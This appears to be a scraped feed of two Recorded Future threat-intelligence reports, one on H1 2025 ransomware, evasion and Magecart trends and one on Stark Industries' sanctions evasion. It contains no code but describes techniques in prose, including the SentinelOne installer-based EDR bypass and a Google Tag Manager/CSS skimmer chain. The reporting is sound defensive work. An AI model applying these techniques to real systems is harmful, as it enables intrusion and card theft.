BlackBasta members likely migrated to other operations, including Akira, with whom the group had prior connections. Group-IB also assessed that some RansomHub affiliates may have joined Qilin, a ransomware-as-a-service (RaaS) group active since July 2022, citing a spike in victim claims, internal restructuring, and increased activity on cybercriminal forums like RAMP. Meanwhile, DragonForce, a ransomware group active since at least late 2023, claimed to have absorbed RansomHub’s infrastructure and affiliates, potentially as a result of a hostile takeover. DragonForce is not averse to such aggressive tactics; the group was identified as a potential culprit behind the May 7, 2025, defacement of LockBit’s affiliate administrative panels and leak of affiliates’ information, and the April 5, 2025, defacement of Everest’s extortion blog.\nFigure 14: Top ten ransomware groups by number of victims claimed in H1 2025 (Source: Recorded Future)\nTo gain notoriety in this ever-evolving ransomware landscape, attract affiliates, and scale operations, ransomware threat actors modified their business models. In mid-March 2025, DragonForce rebranded as a “cartel”, launching a more flexible affiliate model and targeting other ransomware groups. Under the new model, affiliates can use DragonForce’s infrastructure and ransomware tools while operating under independent brands. DragonForce also signaled an openness to partner with or absorb other threat actors rather than just individual affiliates. For example, threat actors employing TTPs associated with Scattered Spider, a financially motivated cybercrime collective, reportedly breached a UK retail company and deployed DragonForce ransomware. The “cartel” approach effectively differentiates DragonForce from other RaaS offerings and is likely to appeal to a range of threat actors, broadening the group’s affiliate base and increasing potential revenue. However, it does not solve issues that have plagued other, more established RaaS operations. The shared infrastructure continues to introduce an element of risk: if an affiliate is compromised, other affiliates' operational and victim details could also be exposed.\nAnubis, a ransomware operation first observed in December 2024, used a different tactic to entice affiliates. In late February 2025, the group debuted an affiliate model that features three modes. The first is a traditional RaaS model in which Anubis provides a ransomware payload and affiliates perceive 80% of any extorted ransom. The second is a data ransom model in which Anubis helps affiliates monetize sensitive data they have already stolen from target companies. The third model allows affiliates to provide Anubis operators with initial access to corporate networks in return for 50% of any extorted ransom.\nLastly, in mid-June 2025, Qilin introduced a new function dubbed “Call Lawyer,” offering affiliates legal consultation on how to intimidate victims during the negotiation phase.\nNew Initial Access, Defense Evasion, and Malware Deployment Techniques\nParallel to changes in the broader ransomware landscape and RaaS offerings, Insikt Group observed ransomware threat actors adopt new TTPs across multiple phases of the attack chain, including initial access, defense evasion, and payload deployment.\nInitial Access: According to Sekoia, Interlock ransomware used ClickFix in social engineering attacks impersonating IT tools between January and February 2025. As mentioned in the Malware TTP Trends and Insights section of this report, ClickFix is a social engineering method that uses fake error messages or verification prompts to deceive victims into executing malicious scripts, either manually or via automatic clipboard manipulation.\nDefense Evasion: Per Palo Alto’s Unit42 and ESET, ransomware threat actors are increasingly using “EDR killers,” tools designed to terminate defensive software, further confirming a trend that has been ongoing since 2022. Notably, ransomware threat actors are also employing new “bring-your-own-installer” (BYOI) techniques to disable EDR altogether. As reported by Aon, a Babuk ransomware intrusion saw the attacker exploiting a flaw in SentinelOne’s upgrade/downgrade process to bypass its anti-tamper protections without needing the management console code. By running a legitimate installer for a different version and terminating the msiexec.exe process mid-upgrade, the attacker left the system without active EDR protection. This created a window in which Babuk ransomware could be executed on an unprotected endpoint. The bypass was confirmed to work across multiple SentinelOne versions unless the \"Online Authorization\" setting was enabled.\nPayload Deployment: Trend Micro reported that Qilin ransomware attacks used a custom and heavily obfuscated .NET-based loader dubbed NETXLOADER to deliver ransomware payloads and SmokeLoader in memory. NETXLOADER is protected by .NET Reactor. It stealthily decrypts and directly injects payloads into memory using dynamic API calls and JIT hooking to evade detection.\nAdditionally, ransomware threat actors employed uncommon and legitimate software tools during their intrusion, almost certainly to collect data, achieve persistence, and move laterally, while avoiding detection. For example, in mid-June 2025, Symantec reported that a May 2025 Fog ransomware attack targeting a financial institution in Asia involved dual-use and open-source penetration testing tools not typically associated with ransomware operations. These included the following:\nSyteca: A legitimate employee monitoring software with keylogging and screen capture capabilities, which Fog operators likely used for espionage and credential theft, followed by cleanup actions to evade detection\nGC2: An open-source C2 framework that uses Google Sheets or SharePoint for command execution and file exfiltration, which Fog operators likely used for remote access, persistence, and defense evasion via cloud-based communications\nAdaptix: An open-source post-exploitation agent similar to Cobalt Strike, which Fog operators likely used for remote access and internal lateral movement through encrypted C2\nStowaway: An open-source proxy tool for creating covert communication tunnels between compromised hosts and operators, which Fog operators likely used to evade defenses by proxying communications and delivering Syteca\nThis pattern was not unique to Fog ransomware. A July 2025 CISA report detailed Interlock ransomware campaigns that likewise repurposed legitimate tools to evade detection and maintain access. Threat actors installed AnyDesk, a remote monitoring and management application, to preserve access and facilitate file transfers, and used PuTTY, a widely used SSH client, to establish tunnels for covert communications and pivot between compromised systems.\nIncorporating commercially available and dual-use software into their intrusion workflows, ransomware threat actors can blend in with routine administrative activity, making malicious actions less likely to trigger security alerts. This continued adoption of legitimate or dual-use software by ransomware actors underscores a broader trend toward intrusion methods designed to evade detection while enabling adaptable, multi-purpose operations inside victim networks.\nMagecart Infections Remained High in H1 2025\nIn the first half of 2025, Magecart e-skimming continued to threaten online merchants at scale. Infection volumes remained near the record highs seen in late 2024, albeit with a slight decline from the peak. Thousands of e-commerce domains were impacted in H1 2025, keeping Magecart a widespread concern for payment security. This sustained activity follows an unprecedented spike in Magecart incidents during 2024, when the number of affected e-commerce domains roughly tripled compared to 2023. That surge was largely driven by the exploitation of a critical Adobe Commerce (Magento) vulnerability dubbed CosmicSting (CVE-2024-34102), which enabled mass compromise of merchant websites. Organized threat groups also amplified the outbreak; for example, one Magecart group (known as “Burunduki”) alone infected over 200 online stores globally in late 2024. By early 2025, patches and defensive measures began curbing the CosmicSting-fueled wave, but overall Magecart infection rates remained significantly elevated above early 2024 levels.\nFigure 15: Illustration of Magecart skimming attack flow (Source: Recorded Future)\nMagecart operators in H1 2025 continued to leverage malware kits and tactics introduced in the prior year, while also expanding into new platforms. Out-of-the-box e-skimmer kits such as “Sniffer by Fleras”, first observed in 2024, remained active in compromises of online stores. Meanwhile, attackers broadened their focus beyond Magento; notably, Magecart skimmers extended to WordPress-based retail sites by exploiting WooCommerce plugins. These campaigns underline how Magecart techniques have widened in scope, targeting a broader range of e-commerce platforms rather than just traditional Magento stores.\nFinally, Magecart skimming techniques continued to evolve in H1 2025. Threat actors experimented with more covert loading methods to evade detection. In one example, attackers used a modular chain of Google Tag Manager (GTM) containers, where one container loaded a fake CSS file that embedded JavaScript within a ::before content property. A second GTM container then extracted and executed this hidden code by targeting a specific <link> element in the Document Object Model (DOM), initiating a WebSocket connection for real-time data exfiltration. These technical refinements underscore the adaptability of Magecart operations and the ongoing need for vigilant web security measures.\nMitigations\nOrganizations can use the following measures to mitigate the threats discussed in this report.\nVulnerability Exploitation\nRecorded Future Vulnerability Intelligence: Recorded Future customers can use Vulnerability Intelligence to gain timely and comprehensive insights into publicly and privately known vulnerabilities tailored to specific security needs that can help prioritize remediation measures. With Vulnerability Intelligence, customers also gain access to Nuclei templates created by Insikt Group, enabling proactive scanning and rapid detection of emerging vulnerabilities.\nRecorded Future Attack Surface Intelligence: Recorded Future customers can use external Attack Surface Intelligence to maintain real-time visibility into network assets, prioritize exposures to remediate, and enforce security controls.\nAsset and Exposure Inventory: Conduct regular inventories of all internet-facing hosts, including remote access appliances, edge devices, and third-party software. Prioritize monitoring gateway-layer products (such as SSL-VPNs, firewalls, and virtualization underlays), which were frequently exploited in H1 2025. Run scheduled scans to identify shadow IT assets and newly exposed services to fill critical security gaps.\nAgile Patch Management: Develop and enforce rapid patch deployment workflows for vulnerabilities with known public PoCs or active exploitation. Prioritize vulnerabilities that are remotely exploitable, require no authentication, or affect widely deployed software (such as Microsoft, Ivanti, or Fortinet). When immediate patching is not possible, apply mitigation controls (such as WAF rules or IPS signatures) and restrict access to the affected service.\nHarden Internet-Facing and Security Appliances: Enforce multi-factor authentication on all administrative interfaces and disable unused or legacy services (such as insecure SSH or Telnet). Segregate edge-device management networks from production networks, and restrict the internal subnets a compromised VPN or firewall can reach.\nMalware Intrusions\nRecorded Future Hunting Packages: Recorded Future customers can implement Hunting Packages developed by Insikt Group to monitor for intrusions associated with prominent malware families.\nEDR, Heuristic, and Behavior-Based Analysis: Implement heuristic and behavior-based analysis through EDR solutions to detect and respond to threat actor TTPs, such as JIT hooking, protected payloads, and memory injection. Ensure that EDR tools are not only deployed but also actively monitored and updated.\nApplication Allowlisting and Script Control: Enforce strict application allowlisting and execution control policies to prevent unauthorized script executions.\nEmployee Education: Educate employees on the latest delivery and execution techniques prominent malware use to spread, such as new or updated social engineering lures like ClickFix.\nMagecart Attacks\nRecorded Future Payment Fraud Intelligence: Recorded Future customers can use Payment Fraud Intelligence to monitor ongoing Magecart e-skimmer infections, stay current with the latest Magecart TTPs, enhance prevention strategies, and take action on compromised cards before fraud occurs.\nRegular Security Audits and Vulnerability Scanning: Conduct security audits and automated vulnerability scans regularly to identify and remediate vulnerabilities affecting the technologies underpinning e-commerce websites.\nContent Security Policy (CSP): Deploy and update a strict CSP to control resources loaded on e-commerce websites and prevent the execution of unauthorized scripts.\nThird-Party Integrations Monitoring: Frequently audit and secure all third-party scripts and integrations used on e-commerce websites. Monitor and restrict access to these integrations to prevent unauthorized modifications.\nEnforce PCI DSS 4.0 Requirements 6.4.3 and 11.6.1: As of March 31, 2025, requirements 6.4.3 and 11.6.1 are now mandatory for organizations handling payment card data. These provisions require a documented inventory of all payment‑page scripts, explicit authorization and business justification for each script, integrity monitoring, and real-time change detection with alerts for unauthorized modifications.\nOutlook\nIn the remainder of 2025, Insikt Group assesses that exploitation of edge-security appliances, remote access tools, and other gateway-layer software will almost certainly remain a top priority for both state-sponsored and financially motivated threat actors. The strategic value of these systems — acting as intermediaries for encrypted traffic and privileged access — makes them high-reward targets. As seen in H1 2025, vulnerabilities in products from Microsoft, Fortinet, Ivanti, and others continue to be exploited even after public disclosure, particularly when PoC code becomes available. Insikt Group expects this trend to accelerate, especially given the growing lag between vulnerability disclosure and patch implementation across enterprises.\nGiven its steep adoption curve, Insikt Group assesses that ClickFix will almost certainly remain a favored initial access technique through the rest of 2025. Unless widespread mitigations or awareness campaigns reduce its effectiveness, the technique’s ease of deployment and efficacy will likely sustain its prevalence in the near term.\nMalware development is also expected to continue along two concurrent paths: the repurposing of legacy code and the refinement of stealth techniques. The resurgence of Sality and Tofsee, alongside more advanced loaders and evasive delivery mechanisms like JIT hooking, suggests that actors will continue blending old tools with modern obfuscation to defeat signature-based defenses. Insikt Group anticipates that commodity RATs will remain prominent due to their accessibility and versatility for persistent access and data theft.\nMobile malware will likely play an increasingly important role in cybercriminal operations, particularly with the growth of contactless payment fraud and virtualization-based evasion techniques. Threat actors will almost certainly continue targeting mobile banking and NFC technologies, leveraging both fake app distribution and supply-chain compromises to infect devices at scale.\nIn the ransomware ecosystem, Insikt Group expects to see continued experimentation with business models and affiliate structures. “Cartel”-style approaches, such as those introduced by DragonForce, alongside flexible affiliate tiers and services like legal intimidation support, are likely to gain traction as groups seek differentiation and resilience in a post-LockBit landscape. Parallel innovation in defense evasion and deployment, including BYOI exploits and password-protected payloads, will likely persist as defenders improve endpoint and network monitoring.\nMagecart activity is expected to remain steady or increase in sophistication through the end of 2025. With e-commerce remaining a lucrative target, threat actors will likely adopt even more modular and covert skimming methods, abusing legitimate services like Google Tag Manager or exploiting under-patched plugins across platforms like WooCommerce. Continued abuse of obscure HTML tags, CSS properties, and obfuscated JavaScript delivery mechanisms is likely as attackers aim to bypass increasingly strict content security policies.\nOverall, the H1 2025 trends suggest that defenders must prepare for a hybrid threat environment in which aging malware resurfaces alongside cutting-edge delivery chains and mobile platforms and edge systems become focal points of exploitation. Cross-platform visibility, tighter app and gateway security, and proactive intelligence integration will be critical to managing these evolving risks through the second half of the year.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_1229ac62a846d9b9e83d22ef5dd13ebbcc99bbc6a.gif?width=1200&format=pjpg&optimize=medium"},"content":"Explore Recorded Future’s H1 2025 malware & vulnerability trends: key exploited CVEs, most-targeted vendors (Microsoft, edge devices), ransomware & mobile malware shifts — practical guidance to prioritize patches and detection.","contentSnippet":"Explore Recorded Future’s H1 2025 malware & vulnerability trends: key exploited CVEs, most-targeted vendors (Microsoft, edge devices), ransomware & mobile malware shifts — practical guidance to prioritize patches and detection.","guid":"https://www.recordedfuture.com/research/h1-2025-malware-and-vulnerability-trends","categories":["Research (Insikt)"],"isoDate":"1970-01-21T07:52:19.000Z","tag":"intel"},{"title":"One Step Ahead: Stark Industries Solutions Preempts EU Sanctions","link":"https://www.recordedfuture.com/research/one-step-ahead-stark-industries-solutions-preempts-eu-sanctions","pubDate":"Wed, 21 Jan 1970 07:50:52 GMT","content:encoded":"\n      <div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1fc49964e13a22a562cd72708432c38c3e02e776d.gif?width=750&amp;format=gif&amp;optimize=medium\" width=\"1600\" height=\"600\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <h1>One Step Ahead: Stark Industries Solutions Preempts EU Sanctions</h1>\n            </div>\n          </div>\n        </div>\n      </div>\n      <div></div>\n      <div>\n        <h2>Executive Summary</h2>\n        <p>Prior to being designated for sanctions by the European Union on May 20, 2025, UK-registered web-hosting provider Stark Industries Solutions Ltd executed a series of infrastructure and organizational changes. Insikt Group assesses this activity to be a strategic effort to preempt impending sanctions and preserve operational continuity. Changes included the registration of a new entity in RIPE, PQ Hosting Plus S.R.L., and, as early as April 10, 2025, the migration of Russian infrastructure to UFO Hosting LLC. Notably, on May 8, 2025, twelve days prior to the sanctions, Moldovan and EU media reported on the forthcoming inclusion of the Neculiti brothers in the next EU sanctions package, citing leaked documentation.<br /><br />Following the sanctions, Insikt Group observed the rebranding of Stark Industries operations to “THE.Hosting”, under the control of Dutch entity “WorkTitans B.V.”, and the creation of a new autonomous system, AS209847 (THE), on June 24, 2025. Although the majority of associated infrastructure remains attributable to Stark Industries, these changes likely reflect an attempt to obfuscate ownership and sustain hosting services under new legal and network entities. Insikt Group assesses that the EU’s sanctioning of Stark Industries was largely ineffective, as affiliated infrastructure remained operational and services were rapidly re-established under new branding, with no significant or lasting disruption.<br /><br />This outcome highlights how threat activity enablers (TAEs) — entities that enable malicious cyber activity by providing infrastructure or services leveraged by threat actors — that retain such significant control over RIPE resources, such as Local Internet Registries (LIRs), Autonomous Systems (ASes), and IP prefixes, are particularly well-positioned to rebrand, reallocate infrastructure, and maintain operational continuity in the absence of meaningful intervention by RIPE NCC. More broadly, the case demonstrates the structural resilience of modern TAEs and underscores the need not only for sustained monitoring by network defenders but also for coordinated, cross-border collaboration among policymakers and law enforcement. Regional sanctions alone are insufficient; meaningfully disrupting TAEs operating at the scale of Stark Industries requires a comprehensive, multilateral approach.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Stark Industries, along with its CEO and owner, was formally sanctioned by the Council of the European Union on May 20, 2025, for enabling Russian state-sponsored cyber operations, including information manipulation, infrastructure for cyberattacks, and other destabilizing hybrid threats against the EU and its partners.</li>\n          <li>Stark Industries preempted its EU designation through a series of calculated infrastructure and organizational changes, including the registration of new RIPE entities and the early migration of Russian infrastructure to UFO Hosting LLC.</li>\n          <li>On May 29, 2025, nine days after the EU designation, PQ.Hosting publicly rebranded to THE.Hosting, transferring assets and infrastructure to the Dutch-registered entity WorkTitans B.V. RIPE records show IP prefix and ASN transfers aligning with the rebrand, while website updates briefly referenced WorkTitans as the legal entity.</li>\n          <li>All transitional entities, PQ Hosting Plus S.R.L., UFO Hosting LLC, and WorkTitans B.V., share RIPE maintainer objects linked to the email address jama**[@]gmail[.]com, which Insikt Group attributes to Dmitrii Miasnikov, a known Russian network operator. These maintainer objects were responsible for all associated RIPE organizations.</li>\n          <li>Stark Industries’ pre- and post-sanctions activities reflect a deliberate, multi-phase restructuring designed to minimize the impact of EU designations while sustaining its role as a threat activity enabler (TAE). Despite sanctions, the entity successfully maintained infrastructure availability and operational continuity under alternative legal and network identities.</li>\n        </ul>\n        <h2>The Enduring Challenge of Threat Activity Enablers</h2>\n        <p>The global cybersecurity landscape is increasingly shaped by the proliferation of threat activity enablers (TAEs), which are entities that enable malicious cyber activity by providing infrastructure or services leveraged by threat actors. Some such entities can present as lawful businesses, relying on legal or technical obfuscation to avoid accountability while tolerating varying degrees of malicious activity.</p>\n        <p>This nuanced descriptor encompasses a broad spectrum of modern enabling services, such as hosting providers who selectively respond to abuse reports or law enforcement requests to maintain plausible deniability, to more traditional bulletproof hosting providers that ignore all oversight.<br /><br />TAEs that provide hosting services pose significant and enduring challenges for several reasons:</p>\n        <ul>\n          <li><strong>Obfuscation and Evasion:</strong> TAEs routinely navigate legal loopholes and use complex corporate structures, shell companies, and distributed infrastructure across multiple jurisdictions to obscure their true ownership and the nature of their services. This makes identification, attribution, and legal action exceedingly difficult for law enforcement and cybersecurity researchers.</li>\n          <li><strong>RIPE Resource Abuse:</strong> Many TAEs maintain strategic control over RIPE (Réseaux IP Européens) resources, including IP ranges, Autonomous Systems (ASs), and associated registration objects, enabling them to manipulate and redistribute network resources at will. This infrastructure control allows TAEs to rapidly rebrand, spin up new entities, and distribute fresh subnets and ASNs, often to evade sanctions or scrutiny.</li>\n          <li><strong>Enabling Diverse Threat Actors:</strong> By providing services such as web hosting, Virtual Private Servers (VPS), Virtual Private Networking (VPN) services, and proxy networks, TAEs can become critical enablers for a wide array of cyber threats. This includes ransomware operators, infostealer campaigns, botnets, state-aligned threat actors, hacktivists, and influence operations. Their services allow threat actors to maintain anonymity, launch attacks, and host malicious content with varying degrees of resiliency against takedown efforts.</li>\n        </ul>\n        <p>Insikt Group has tracked and reported on long-established and emerging TAEs, leveraging Recorded Future’s Network Intelligence to assess the concentration of malicious activity relative to the total size of IP space under an ASN’s control. This highlights operators whose infrastructure is disproportionately associated with threat activity.</p>\n        <h2>Background</h2>\n        <p>Stark Industries Solutions, a web-hosting provider that has recently drawn international attention due to recent sanctions, has roots deeply embedded in the hosting industry. It has evolved from the individual ventures of its founders to a sophisticated global network.</p>\n        <p>Stark Industries was officially incorporated in the United Kingdom on February 10, 2022, notably just two weeks prior to Russia's full-scale invasion of Ukraine. The company primarily offers web-hosting services, including VPSs, <a href=\"https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/#:~:text=74%20VPN%20services%2C%20and%2040%20different%20proxy%20services\">numerous</a> proxy services, and VPNs. It was founded by brothers Iurie Neculiti and Ivan Neculiti, whose involvement in illicit hosting dates back over a decade, as Ivan’s previous web-hosting service, Morenehost, <a href=\"https://correctiv.org/faktencheck/russland-ukraine/2024/05/16/hacks-und-propaganda-zwei-brueder-aus-moldau-tragen-russlands-digitalen-krieg-nach-europa/#:~:text=web%20hosting%20service%2C-,Morenehost,-%2C%20writes%20the%20IT\">gained</a> notoriety for enabling cyber threats (his ownership was <a href=\"https://offshoreleaks.icij.org/nodes/240120865\">revealed</a> through the <a href=\"https://www.icij.org/investigations/pandora-papers/investigators-worldwide-continue-to-open-pandoras-box-to-pursue-criminals-identified-in-pandora-papers-two-years-after-icijs-landmark-investigation/?gad_source=1&amp;gad_campaignid=20646016706&amp;gbraid=0AAAAACpCrOhNxDH5TPUfl3QeXD6K9oMkx&amp;gclid=CjwKCAjwy7HEBhBJEiwA5hQNogimdOqwA8iVIixypjK9dFRqwY4lcbTdisV-hgfzhyhFGH7A3DxfRBoCFuYQAvD_BwE\">Pandora Papers</a> data leak).</p>\n        <p>Stark Industries Solutions functioned mainly as a pass-through company designed to obscure the true nature of its operations. In effect, transactions with Stark Industries were transactions with PQ.Hosting, though this was not immediately apparent to external parties. Ivan Neculiti <a href=\"https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/#:~:text=Reached%20via%20LinkedIn%2C-,Mr.%20Neculiti%20said,-PQ%20Hosting%20established\">characterized</a> Stark Industries as a \"white label\" brand, enabling resellers to distribute PQ.Hosting's services without direct customer interaction. The Neculiti brothers strategically established companies in Moldova, Russia, and Great Britain, creating a complex corporate structure engineered for obfuscation.</p>\n        <p>Following the onset of the war in Ukraine, Stark Industries rapidly became a central platform for significant distributed denial-of-service (DDoS) attacks conducted by hacktivist group NoName057(16). Furthermore, Stark Industries' infrastructure was <a href=\"https://krebsonsecurity.com/2024/07/the-stark-truth-behind-the-resurgence-of-russias-fin7/\">highlighted</a> in early 2024 as central to the resurgence of the financially motivated threat actor FIN7.

This analysis revealed that the email address was not only associated with PQHS-MNT (PQ.Hosting maintainer) and <a href=\"https://apps.db.ripe.net/db-web-ui/lookup?source=ripe&amp;key=UFO42-MNT&amp;type=mntner\">UFO42-MNT</a> (UFO Hosting maintainer), but also with the newly created <a href=\"https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=mntner&amp;key=THE-HOSTING-MNT\">THE-HOSTING-MNT</a>. As of June 24, 2025, these maintainer objects were responsible for all of the new RIPE organization objects outlined in this report, as well as further organizations tied to the Neculiti brothers, such as <a href=\"https://srl.md/en/societatea-cu-raspundere-limitata-weiss-hosting-group\">WEISS HOSTING GROUP S.R.L.</a> (<a href=\"https://apps.db.ripe.net/db-web-ui/lookup?source=RIPE&amp;type=organisation&amp;key=ORG-PHS16-RIPE\">ORG-PHD16-RIPE</a>; see <strong>Figure 16</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_116f372effd20925482ba54b2d982539c74690efd.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1164\" height=\"952\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 16:</strong> Maintainer objects and organizations linked to email jama**[@]gmail[.]com (Source: Recorded Future / <a href=\"https://apps.db.ripe.net/db-web-ui/query\">RIPE DB</a>)</div>\n          </div>\n        </div>\n        <p>Further research into this email address confirmed its attribution to Dmitrii Miasnikov, a known Russian network operator with prior affiliations to numerous Russia-based hosting providers.

Insikt Group notes that as of June 24, 2025, only one prefix was assigned to ORG-DAM5-RIPE, 91[.]207[.]183[.]0/24, which was outlined in <strong>Appendix B</strong>, as announced via AS33993 (UFO-AS).</p>\n        <p>Both objects contain the email address admin[@]virty[.]io, which refers to another Russian ISP, virty[.]io, which is owned by First Data Center LLC (ООО \"Первый ЦОД\"). In addition to traditional hosting, the company offers a number of what it calls “RIPE Object Support and Registration Services” (see <strong>Figure 17</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1d4d2850644505d4daa2cae1674b17c00064eabe3.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1033\" height=\"933\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 17:</strong> Virty[.]io RIPE services web page (Source: virty[.]io)</div>\n          </div>\n        </div>\n        <p>Insikt Group assesses that Miasnikov’s control over RIPE object registration services, combined with his access to multiple LIRs and maintainer objects, likely enabled him to facilitate the creation, transfer, and operational handoff of RIPE assets for Stark Industries, allowing the sanctioned entity to sustain infrastructure continuity under new organizational entities.</p>\n        <h2>Mitigations</h2>\n        <ul>\n          <li><strong>Use Recorded Future Threat Intelligence:</strong> Recorded Future customers can proactively mitigate threats originating from malicious networks such as Stark Industries by operationalizing Recorded Future Intelligence Cloud data, specifically by leveraging continuously updated Risk Lists and by blocklisting validated malicious IP addresses to prevent internal communication with malicious infrastructure.</li>\n          <li><strong>Implement Robust Network Security Controls:</strong> Configure perimeter security appliances and internal network defenses to block traffic originating from the ASNs identified in this report, unless there is a clearly defined business justification for permitting such traffic.</li>\n        </ul>\n        <h2>Outlook</h2>\n        <p>Insikt Group assesses that Stark Industries will likely continue operating with minimal disruption under its new corporate entities, THE.Hosting and UFO Hosting, despite its inclusion in the EU’s May 2025 sanctions package. The evidence outlined in this report demonstrates that the organization likely anticipated the EU sanctions and executed a deliberate, multi-phase restructuring of its hosting operations, using its parent company, PQ.Hosting, and Russian ISP, UFO Hosting.</p>\n        <p>While the EU sanctions did reference PQ.Hosting, the company’s omission from a formal designation as part of the package, along with other linked entities, may have been a critical gap. This allowed Stark Industries to rapidly rebrand, transfer assets, and preserve operational control through affiliated RIPE organizations and front companies with relative ease.</p>\n        <p>Insikt Group will continue to monitor the infrastructure, affiliations, and evolution of this TAE network, as its persistent role in supporting global malicious cyber operations remains a critical indicator of future threat activity.</p>\n        <h2>Appendix A: Malware Intelligence Queries</h2>\n        <div>\n          <div>\n            <div>\n              <p>dynamic.network.ips.asn ==

Industries Solutions Preempts EU Sanctions\n\n      \nExecutive Summary\nPrior to being designated for sanctions by the European Union on May 20, 2025, UK-registered web-hosting provider Stark Industries Solutions Ltd executed a series of infrastructure and organizational changes. Insikt Group assesses this activity to be a strategic effort to preempt impending sanctions and preserve operational continuity. Changes included the registration of a new entity in RIPE, PQ Hosting Plus S.R.L., and, as early as April 10, 2025, the migration of Russian infrastructure to UFO Hosting LLC. Notably, on May 8, 2025, twelve days prior to the sanctions, Moldovan and EU media reported on the forthcoming inclusion of the Neculiti brothers in the next EU sanctions package, citing leaked documentation.\nFollowing the sanctions, Insikt Group observed the rebranding of Stark Industries operations to “THE.Hosting”, under the control of Dutch entity “WorkTitans B.V.”, and the creation of a new autonomous system, AS209847 (THE), on June 24, 2025. Although the majority of associated infrastructure remains attributable to Stark Industries, these changes likely reflect an attempt to obfuscate ownership and sustain hosting services under new legal and network entities. Insikt Group assesses that the EU’s sanctioning of Stark Industries was largely ineffective, as affiliated infrastructure remained operational and services were rapidly re-established under new branding, with no significant or lasting disruption.\nThis outcome highlights how threat activity enablers (TAEs) — entities that enable malicious cyber activity by providing infrastructure or services leveraged by threat actors — that retain such significant control over RIPE resources, such as Local Internet Registries (LIRs), Autonomous Systems (ASes), and IP prefixes, are particularly well-positioned to rebrand, reallocate infrastructure, and maintain operational continuity in the absence of meaningful intervention by RIPE NCC. More broadly, the case demonstrates the structural resilience of modern TAEs and underscores the need not only for sustained monitoring by network defenders but also for coordinated, cross-border collaboration among policymakers and law enforcement. Regional sanctions alone are insufficient; meaningfully disrupting TAEs operating at the scale of Stark Industries requires a comprehensive, multilateral approach.\nKey Findings\nStark Industries, along with its CEO and owner, was formally sanctioned by the Council of the European Union on May 20, 2025, for enabling Russian state-sponsored cyber operations, including information manipulation, infrastructure for cyberattacks, and other destabilizing hybrid threats against the EU and its partners.\nStark Industries preempted its EU designation through a series of calculated infrastructure and organizational changes, including the registration of new RIPE entities and the early migration of Russian infrastructure to UFO Hosting LLC.\nOn May 29, 2025, nine days after the EU designation, PQ.Hosting publicly rebranded to THE.Hosting, transferring assets and infrastructure to the Dutch-registered entity WorkTitans B.V. RIPE records show IP prefix and ASN transfers aligning with the rebrand, while website updates briefly referenced WorkTitans as the legal entity.\nAll transitional entities, PQ Hosting Plus S.R.L., UFO Hosting LLC, and WorkTitans B.V., share RIPE maintainer objects linked to the email address jama**[@]gmail[.]com, which Insikt Group attributes to Dmitrii Miasnikov, a known Russian network operator. These maintainer objects were responsible for all associated RIPE organizations.\nStark Industries’ pre- and post-sanctions activities reflect a deliberate, multi-phase restructuring designed to minimize the impact of EU designations while sustaining its role as a threat activity enabler (TAE). Despite sanctions, the entity successfully maintained infrastructure availability and operational continuity under alternative legal and network identities.\nThe Enduring Challenge of Threat Activity Enablers\nThe global cybersecurity landscape is increasingly shaped by the proliferation of threat activity enablers (TAEs), which are entities that enable malicious cyber activity by providing infrastructure or services leveraged by threat actors. Some such entities can present as lawful businesses, relying on legal or technical obfuscation to avoid accountability while tolerating varying degrees of malicious activity.\nThis nuanced descriptor encompasses a broad spectrum of modern enabling services, such as hosting providers who selectively respond to abuse reports or law enforcement requests to maintain plausible deniability, to more traditional bulletproof hosting providers that ignore all oversight.\nTAEs that provide hosting services pose significant and enduring challenges for several reasons:\nObfuscation and Evasion: TAEs routinely navigate legal loopholes and use complex corporate structures, shell companies, and distributed infrastructure across multiple jurisdictions to obscure their true ownership and the nature of their services. This makes identification, attribution, and legal action exceedingly difficult for law enforcement and cybersecurity researchers.\nRIPE Resource Abuse: Many TAEs maintain strategic control over RIPE (Réseaux IP Européens) resources, including IP ranges, Autonomous Systems (ASs), and associated registration objects, enabling them to manipulate and redistribute network resources at will. This infrastructure control allows TAEs to rapidly rebrand, spin up new entities, and distribute fresh subnets and ASNs, often to evade sanctions or scrutiny.\nEnabling Diverse Threat Actors: By providing services such as web hosting, Virtual Private Servers (VPS), Virtual Private Networking (VPN) services, and proxy networks, TAEs can become critical enablers for a wide array of cyber threats. This includes ransomware operators, infostealer campaigns, botnets, state-aligned threat actors, hacktivists, and influence operations. Their services allow threat actors to maintain anonymity, launch attacks, and host malicious content with varying degrees of resiliency against takedown efforts.\nInsikt Group has tracked and reported on long-established and emerging TAEs, leveraging Recorded Future’s Network Intelligence to assess the concentration of malicious activity relative to the total size of IP space under an ASN’s control. This highlights operators whose infrastructure is disproportionately associated with threat activity.\nBackground\nStark Industries Solutions, a web-hosting provider that has recently drawn international attention due to recent sanctions, has roots deeply embedded in the hosting industry. It has evolved from the individual ventures of its founders to a sophisticated global network.\nStark Industries was officially incorporated in the United Kingdom on February 10, 2022, notably just two weeks prior to Russia's full-scale invasion of Ukraine. The company primarily offers web-hosting services, including VPSs, numerous proxy services, and VPNs. It was founded by brothers Iurie Neculiti and Ivan Neculiti, whose involvement in illicit hosting dates back over a decade, as Ivan’s previous web-hosting service, Morenehost, gained notoriety for enabling cyber threats (his ownership was revealed through the Pandora Papers data leak).\nStark Industries Solutions functioned mainly as a pass-through company designed to obscure the true nature of its operations. In effect, transactions with Stark Industries were transactions with PQ.Hosting, though this was not immediately apparent to external parties. Ivan Neculiti characterized Stark Industries as a \"white label\" brand, enabling resellers to distribute PQ.Hosting's services without direct customer interaction. The Neculiti brothers strategically established companies in Moldova, Russia, and Great Britain, creating a complex corporate structure engineered for obfuscation.\nFollowing the onset of the war in 